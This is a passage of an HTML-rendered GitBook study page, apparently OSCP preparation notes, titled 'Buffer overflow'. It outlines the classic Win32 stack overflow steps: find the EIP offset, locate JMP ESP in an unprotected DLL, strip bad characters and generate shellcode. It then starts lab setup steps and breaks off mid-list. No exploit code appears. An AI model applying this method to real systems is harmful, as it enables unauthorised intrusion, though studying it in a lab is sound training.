            <div id="__GITBOOK__ROOT__SERVER__"><div class="reset-3c756112--body-68cac36c" data-reactroot=""><div class="reset-3c756112--header-07037613--header-11420428"><div class="reset-3c756112--headerContainer-bb8cc0bc"><div class="reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26"><div role="button" tabindex="-1" class="reset-3c756112--mobileButton-7a76d05f"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380--icon-1f8349b3"><g><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></g></svg></div><div class="reset-3c756112--headerLogo-5c0b38e2"><div class="reset-3c756112--mobileLogo-dacfd15c"><a class="link-a079aa82--primary-53a25e66--logoLink-10d08504" style="color:#bf272e" href="/hackers-grimoire/"><div class="reset-3c756112--tooltipContainer-7fdb9b70--small-2ec8ae1a"><div class="reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a"><img class="image-67b14f24--avatar-1c1d03ec" src="https://blobs.gitbook.com/spaces%2F-LMNRaGfniDGOexfu2Y6%2Favatar.png?generation=1545335358292957&amp;alt=media"/></div></div><div class="reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-6bd5cc81"><span class="text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1--spaceNameText-677c2969">Hacker&#x27;s Grimoire</span></div></a></div><div class="reset-3c756112--desktopLogo-a594db90"><a class="link-a079aa82--primary-53a25e66--logoLink-10d08504" style="color:#bf272e" href="/hackers-grimoire/"><div class="reset-3c756112--tooltipContainer-7fdb9b70--medium-296350e4"><div class="reset-3c756112--avatarFrame-2f40cdc9--medium-296350e4"><img class="image-67b14f24--avatar-1c1d03ec" src="https://blobs.gitbook.com/spaces%2F-LMNRaGfniDGOexfu2Y6%2Favatar.png?generation=1545335358292957&amp;alt=media"/></div></div><div class="reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-6bd5cc81"><span class="text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1--spaceNameText-677c2969">Hacker&#x27;s Grimoire</span></div></a></div></div><div role="button" tabindex="-1" class="reset-3c756112--mobileButton-7a76d05f"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380--icon-1f8349b3"><g><circle cx="10.5" cy="10.5" r="7.5"></circle><line x1="21" y1="21" x2="15.8" y2="15.8"></line></g></svg></div></div><div class="reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48"></div></div><div class="reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130"><div class="reset-3c756112--inputContainer-b2cb171c"><div aria-label="" class="reset-3c756112--inputWrapper-63396dac--TextH400-3033861f--medium-4505230f--light-502263b4--input-6d442051--searchInput-3fa812d5"><div class="reset-3c756112--inputInnerSizer-756c9114"><input type="text" placeholder="Search..." class="inputInner-5c86b87d--medium-0bbed4bd--inputInner-4216b016--searchInputPlaceholder-936306be"/></div><div class="reset-3c756112--inputAddOn-45de9ec1--inputAddOnPrefix-202fa60d--icon-1f8349b3"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><circle cx="10.5" cy="10.5" r="7.5"></circle><line x1="21" y1="21" x2="15.8" y2="15.8"></line></g></svg></div></div></div></div></div></div><div class="reset-3c756112--bodyContent-2f98451b"><div class="reset-3c756112--wholeContent-9fc567d4"><div class="reset-3c756112--wholeContentBody-554be184"><div role="presentation" class="reset-3c756112--backdrop-1322b68a--hidden-247382c3--overlay-29559ab8"></div><div class="reset-3c756112--contentNavigation-dd3370a4"><div class="reset-3c756112--contentNavigationInner-205d49ea--contentNavigationInnerCollapsed-7b4aca00"><div class="reset-3c756112--sidebarWrapper-84a13d8e"><div style="padding-bottom:0" class="reset-3c756112"></div><div class="reset-3c756112--sidebar-84a13d8e"><div class="reset-3c756112--sidebarMain-13701e8f"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe"><div class="reset-3c756112--mobileHeader-4e2d4892"><div role="button" tabindex="-1" class="reset-3c756112--mobileHeaderClose-47b8fa64"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></g></svg></div></div><div class="reset-3c756112--pagesTree-4b07cd56"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Hacker&#x27;s Grimoire</span></a></div></div><div class="reset-3c756112"><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/recon"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Reconnaissance</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/exploitation"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Exploitation</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380--pageDocumentIconExpanded-014d853c"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div><div class="reset-3c756112--pageChildren-56f27afc--pageDocumentChildren-2add00e7"><div class="reset-3c756112"><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="/hackers-grimoire/exploitation/web-application"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Web application attacks</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="/hackers-grimoire/exploitation/working-with-exploits"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Working with exploits</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="/hackers-grimoire/exploitation/password-cracking"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Password cracking</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca" href="/hackers-grimoire/exploitation/metasploit"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Metasploit</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--pageItemWithChildrenNested-2c5d8183--navButtonClickable-161b88ca--navButtonOpened-6a88552e" style="color:#bf272e" href="/hackers-grimoire/exploitation/buffer-overflow"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Buffer overflow</span></a></div></div></div></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/post-exploitation"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Post exploitation</span><span class="reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312" role="presentation"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><polyline points="9 18 15 12 9 6"></polyline></g></svg></span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/linux-basics"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Linux basics</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/windows-basics"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Windows basics</span></a></div></div></div></div><div class="reset-3c756112--pageItemWithChildren-56f27afc--S300Bottom-9b4658d2"><div class="reset-3c756112"><div class="reset-3c756112--pageItem-01e3f344"><div class="reset-3c756112--pageComponent-7cc5301a"><a class="navButton-94f2579c--navButtonClickable-161b88ca" href="/hackers-grimoire/learning-resources"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f">Learning resources</span></a></div></div></div></div></div></div></div><div class="reset-3c756112--footer-68e6f18c"><a href="https://www.gitbook.com/?utm_source=content&amp;utm_medium=trademark&amp;utm_campaign=vulp3cula" target="_blank" class="reset-3c756112--trademark-a8da4b94" role="presentation"><div class="reset-3c756112--trademarkLogo-0d2d53bc"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="currentColor" viewBox="0 0 1067 769" xmlns="http://www.w3.org/2000/svg" stroke="none" class="icon-7f6730be--text-3f89f380"><g><path d="M480.026 640.677c17.205 0 31.2 13.997 31.2 31.194s-13.995 31.193-31.2 31.193c-17.197 0-31.193-13.996-31.193-31.193 0-17.197 13.996-31.194 31.193-31.194m489.93-193.226c-17.203 0-31.2-13.998-31.2-31.195 0-17.204 13.997-31.2 31.2-31.2 17.198 0 31.194 13.996 31.194 31.2 0 17.197-13.996 31.195-31.193 31.195m0-127.804c-53.269 0-96.609 43.34-96.609 96.609 0 10.373 1.723 20.702 5.123 30.741L559.328 616.879c-18.132-26.128-47.521-41.617-79.302-41.617-36.821 0-70.391 21.065-86.63 54.003L106.68 478.109c-30.288-15.927-52.965-65.817-50.56-111.223 1.248-23.687 9.438-42.071 21.897-49.17 7.916-4.493 17.436-4.099 27.526 1.188l1.916 1.01c75.96 40.022 324.6 170.981 335.063 175.844 16.157 7.47 25.14 10.5 52.659-2.547l513.958-267.3c7.53-2.844 16.315-10.062 16.315-21.023 0-15.205-15.72-21.199-15.765-21.199-29.218-14.018-74.163-35.054-117.987-55.57C798.033 84.26 691.861 34.547 645.23 10.132c-40.253-21.072-72.655-3.311-78.432.282l-11.227 5.555C345.727 119.743 64.898 258.826 48.911 268.553 20.278 285.973 2.547 320.679.252 363.768c-3.586 68.304 31.261 139.506 81.069 165.634l303.172 156.354c6.83 47.306 47.55 82.725 95.532 82.725 52.78 0 95.808-42.546 96.603-95.14L910.541 492.38c16.93 13.233 37.92 20.486 59.416 20.486 53.268 0 96.61-43.341 96.61-96.61s-43.342-96.61-96.61-96.61" fill-rule="evenodd"></path></g></svg></div><div class="reset-3c756112--trademarkContent-04a01aea"><div class="reset-3c756112"><span class="text-4505230f--TextH200-a3425406--textUIFamily-5ebd8e40">Powered by <b>GitBook</b></span></div></div></a></div></div></div></div></div></div><div class="reset-3c756112--wholeContentPage-6c3f1fc5"><div class="reset-3c756112--wholePageSticky-f53dafd2"><div class="reset-3c756112--pageContainer-3ec6d8d0"><div class="reset-3c756112"><div class="reset-3c756112--pageHeader-15724735"><div class="reset-3c756112--pageHeaderInner-7c0f0284"><div class="reset-3c756112--pageHeaderWrapperContent-6897c946"><div class="reset-3c756112--horizontalFlex-5a0077e0"><div class="reset-3c756112--pageHeaderIntro-0c1463da"><h1 class="reset-3c756112--pageTitle-33dc39a3"><span class="text-4505230f--DisplayH900-bfb998fa--textContentFamily-49a318e1">Buffer overflow</span></h1></div><div style="grid-template-columns:repeat(1, auto)" class="reset-3c756112--toolbar-a6a9f7d2--medium-8e46b02c--pageHeaderToolbar-6457a802--withControlsClosed-3e96e46c"><button class="button-36063075--small-30ceeddb--button-34710834--small-54db2a94"><span class="small-3bde6db7--iconOnly-bddce91a"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="21" y1="10" x2="7" y2="10"></line><line x1="21" y1="6" x2="3" y2="6"></line><line x1="21" y1="14" x2="3" y2="14"></line><line x1="21" y1="18" x2="7" y2="18"></line></g></svg></span><span class="text-4505230f--UIH300-2063425d--textUIFamily-5ebd8e40--text-8ee2c8b2"></span></button></div></div><div class="reset-3c756112--pageHeaderDescription-22970244"></div></div></div></div><div class="reset-3c756112--toaster-c029690e"></div><div class="reset-3c756112--pageBody-a91db4ac"><div data-editioncontainer="true" class="reset-3c756112--container-960c7c26"><div data-slate-editor="true" data-key="2ee161b522ca4f3b8e19dc346281fa08" autoCorrect="on" spellcheck="true" data-gramm="false" style="outline:none;white-space:pre-wrap;word-wrap:break-word"><p class="blockParagraph-544a408c" data-key="378bff90ef1142759026480e80481692"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="0ae09c44c00949eea3a859824db4c778"><span data-offset-key="0ae09c44c00949eea3a859824db4c778:0">Pulling off a classical Win32 buffer overflow is a lot like baking a fancy cake. The </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.foodnetwork.ca/recipe/raspberry-mascarpone-black-forest-cake/15205/" target="_blank" rel="noopener noreferrer" data-key="c4e25f372f1b42b4a369a9c13d0af6d3"><span data-key="0b2a62803d9a447a8af1de9559e4c70f"><span data-offset-key="0b2a62803d9a447a8af1de9559e4c70f:0">cake recipe</span></span></a><span data-key="2daf41c95f5443cc906f8e21fe5e9965"><span data-offset-key="2daf41c95f5443cc906f8e21fe5e9965:0"> is actually a bunch of smaller recipes for the topping, the icing, the layers and the filling. If you don&#x27;t get each mini-recipe right, the cake will suck.</span></span></span></p><p class="blockParagraph-544a408c" data-key="7ba73266768d4754aac9663069f6ee1f"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="7f8239c640ec4f9ca3ce0347e183a92b"><span data-offset-key="7f8239c640ec4f9ca3ce0347e183a92b:0">Similarly, a buffer overflow recipe has the following mini-recipes:</span></span></span></p><p class="blockParagraph-544a408c" data-key="59cb40f7a341403c90d9559b68df4628"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="149f2165fadd42a38b3694072057d7e2"><span data-offset-key="149f2165fadd42a38b3694072057d7e2:0"><strong class="bold-3c254bd9" data-slate-leaf="true">Find the instruction pointer</strong></span></span></span></p><ul class="list-20526648" data-key="316c761ebc344eec8e8506faa143c1a5"><li class=""><div data-key="3b09f0721c1746b9bb6535b519830932" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="a9ec0a400dba4d859b1821ff45c8524d"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="4783d65a4cf546a1863f319875e52657"><span data-offset-key="4783d65a4cf546a1863f319875e52657:0">Make a simple script to shove a bunch of garbage into an input field and crash the program</span></span></span></p></div></li><li class=""><div data-key="77007a65a6254bc79cfe35259faf43d7" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="ba2c02a55d3941bd8e9023e8ce0f1e95"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="cb1bac4ced4d4faa8f92eff72474e611"><span data-offset-key="cb1bac4ced4d4faa8f92eff72474e611:0">Find the exact number of characters required to reach the EIP (instruction pointer)</span></span></span></p></div></li></ul><p class="blockParagraph-544a408c" data-key="0f763f65e4b7478f929f7b3b8d4199c9"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="2e9b4eb35c6a46c3a76df0458e453e44"><span data-offset-key="2e9b4eb35c6a46c3a76df0458e453e44:0"><strong class="bold-3c254bd9" data-slate-leaf="true">Redirect execution of the program</strong></span></span></span></p><ul class="list-20526648" data-key="d07d3a83880e4401920f88e0a85d783b"><li class=""><div data-key="5ed42d1afb394fa0a371d822ffad641f" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="fe0c8d9448894e54bd24391070fb4c2f"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="8657c24c802641f0b96c36f6c693d5a6"><span data-offset-key="8657c24c802641f0b96c36f6c693d5a6:0">Inspect the program&#x27;s .dll files to find one without memory protections </span></span></span></p></div></li><li class=""><div data-key="20a16c95f5704bf093f6ae25959a47b5" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="a5a9676c5e9644ce85f666ef6c1723a7"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="30265239f4ee45459be3dd708034e9ae"><span data-offset-key="30265239f4ee45459be3dd708034e9ae:0">Once you&#x27;ve found a suitable .dll, search for a </span><span data-offset-key="30265239f4ee45459be3dd708034e9ae:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">JMP ESP</code></span><span data-offset-key="30265239f4ee45459be3dd708034e9ae:2"> (jump to the stack pointer) command</span></span></span></p></div></li><li class=""><div data-key="dfb0d5e5983e4831b7721ac6d6ae283b" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="108cbf8d766241d59b170efb7e8af907"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="8dabf76d83b04a2b9fd819e2206dfbdd"><span data-offset-key="8dabf76d83b04a2b9fd819e2206dfbdd:0">Record the memory address for this command</span></span></span></p></div></li></ul><p class="blockParagraph-544a408c" data-key="327fa0dce3d34b55995685e791597ba6"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="66e81fe7fae14b86a7b8b1ec41835eef"><span data-offset-key="66e81fe7fae14b86a7b8b1ec41835eef:0"><strong class="bold-3c254bd9" data-slate-leaf="true">Make shellcode</strong></span></span></span></p><ul class="list-20526648" data-key="afeb788fc4e34a4d883ea323d761b690"><li class=""><div data-key="4de712379a2d4972aca97af514f6fd60" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="d9583cf89be44c4cbbc4605d8776dc3b"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="0b018b376bd1480080e51be596d48351"><span data-offset-key="0b018b376bd1480080e51be596d48351:0">Find the &#x27;bad&#x27; characters that will prevent your exploit from working</span></span></span></p></div></li><li class=""><div data-key="de35e1f13adc41b7b00dfbf0112c5798" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="6f8b67e3aa8d4f18a9a65d3a9f57d509"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="bd0c075635f9476d863b41eb88cbdb0a"><span data-offset-key="bd0c075635f9476d863b41eb88cbdb0a:0">Generate shellcode without bad characters</span></span></span></p></div></li></ul><p class="blockParagraph-544a408c" data-key="2850d5fd61024a74a96756a7e884d90a"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="0058395224184fd796fa31cfa8454391"><span data-offset-key="0058395224184fd796fa31cfa8454391:0"><strong class="bold-3c254bd9" data-slate-leaf="true">Assemble the exploit</strong></span></span></span></p><ul class="list-20526648" data-key="5a5edc03e9f64d3bada3b32f25c41faf"><li class=""><div data-key="2fd6902f77304300afe02668f7e134d4" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="4068110b1389435fac8558e0f7509ebe"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="e55f05be825042c59f00291a44550ba6"><span data-offset-key="e55f05be825042c59f00291a44550ba6:0">Update your simple script to hit the EIP, jump to the ESP and execute your shellcode</span></span></span></p></div></li><li class=""><div data-key="886bc71068d945a0b55c6db6cd093286" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="4cc016cc20ee478faba662a44663a51e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="39536193f98443c8bda70c8c4636276d"><span data-offset-key="39536193f98443c8bda70c8c4636276d:0">Throw in a few nops for breathing room</span></span></span></p></div></li><li class=""><div data-key="263028202a9b4cd5839d6a11dafa58c5" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="99a50217968f4e928ff1492b55dafa17"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="86ce920dd180455f86b33a129865a635"><span data-offset-key="86ce920dd180455f86b33a129865a635:0">Don&#x27;t forget to put the </span><span data-offset-key="86ce920dd180455f86b33a129865a635:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">JMP ESP</code></span><span data-offset-key="86ce920dd180455f86b33a129865a635:2"> memory address in backwards!</span></span></span></p></div></li></ul><p class="blockParagraph-544a408c" data-key="bf2fe874333b4939a5e90196f3b26beb"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="d84628e2f5d940d7a115728a25b64fa2"><span data-offset-key="d84628e2f5d940d7a115728a25b64fa2:0">If you haven&#x27;t done this before, many of the terms above will be unfamiliar, but don&#x27;t worry. You can do simple buffer overflows without knowing much about Assembly or memory layout, and you&#x27;ll learn a lot along the way. I spent far too much time reading about those things and freaking myself out. All you need to get started is in the video below.</span></span></span></p><div data-slate-void="true" data-key="15ebabc5f2e947868fa790aedf4e5b8e"><div><figure contenteditable="false" class="reset-3c756112--figure-c0d4b308"><div class="reset-3c756112"><div class="reset-3c756112--figureLayer-b6ab7c94"><div class="reset-3c756112"><div><div style="left: 0; width: 100%; height: 0; position: relative; padding-bottom: 56.2493%;"><iframe src="https://cdn.iframe.ly/api/iframe?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D1S0aBV-Waeo&amp;key=4fb668ebc74b721f3c2230d81634c8bc" style="border: 0; top: 0; left: 0; width: 100%; height: 100%; position: absolute;" allowfullscreen scrolling="no" allow="autoplay; encrypted-media"></iframe></div></div></div></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"></div></figure></div></div><h1 id="setup" class="blockHeading-442b4f12--blockHeading1WithMargin-b69d755e" data-key="fb9c606422694fabb4edd850ff62bb5f"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH700-04e1a2a3--textContentFamily-49a318e1"><span data-key="2def7ff134a449e0b928b1e654bdb1ac"><span data-offset-key="2def7ff134a449e0b928b1e654bdb1ac:0">Setup</span></span></span><a href="#setup" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div><div role="button" tabindex="0" style="color:#bf272e" contenteditable="false" class="reset-3c756112--blockHeadingUp-c32402b2"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></g></svg></div></h1><p class="blockParagraph-544a408c" data-key="20840828af2c4b7a8d2a5ef6b424088b"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="40c58cc57a45411497c71183d033852b"><span data-offset-key="40c58cc57a45411497c71183d033852b:0">If you&#x27;re signed up for </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/" target="_blank" rel="noopener noreferrer" data-key="c73d63c9deab44cf9bdf9f78e7e29cb3"><span data-key="0cb8e40c971f4b5b955c72380c213a37"><span data-offset-key="0cb8e40c971f4b5b955c72380c213a37:0">PWK-OSCP</span></span></a><span data-key="f2c6ff1eb35e4ed98a9dbc3e38abe77e"><span data-offset-key="f2c6ff1eb35e4ed98a9dbc3e38abe77e:0">, you&#x27;ll get a Windows 7 lab machine with tools installed to practice buffer overflows. It&#x27;s also pretty easy to set up yourself if you can run 2 virtual machines (Kali and Windows) or run a Windows VM on a native Kali machine. In all cases, the Kali machine needs to be able to reach the Windows machine over the network.</span></span></span></p><ol class="list-20526648" data-key="409d7804435849908c0b585b5a51fbb9"><li class=""><div data-key="45751517dabd4125b84b78327ad3863a" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="37d042bdf402407c8f94ace5dc7aef8d"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="200a7ce761d94f79ab8e86bbe30ddd7e"><span data-offset-key="200a7ce761d94f79ab8e86bbe30ddd7e:0">Download and install a </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener noreferrer" data-key="2927c6542c5f4d16abdc50472b080868"><span data-key="f0c5b06a65334032ad6e0f2f8d46bf80"><span data-offset-key="f0c5b06a65334032ad6e0f2f8d46bf80:0">Windows 7 virtual machine</span></span></a><span data-key="291d7f4748354d7e881cb37263a97e81"><span data-offset-key="291d7f4748354d7e881cb37263a97e81:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="71da279efbe54ad4be83abe66e5b23c8" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="8b60dee7385e4e609d656ebb4b53f23d"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="7bf12db008814c678bf7b8abadb67575"><span data-offset-key="7bf12db008814c678bf7b8abadb67575:0"><strong class="bold-3c254bd9" data-slate-leaf="true">Turn off Windows Firewall</strong></span></span></span></p></div></li><li class=""><div 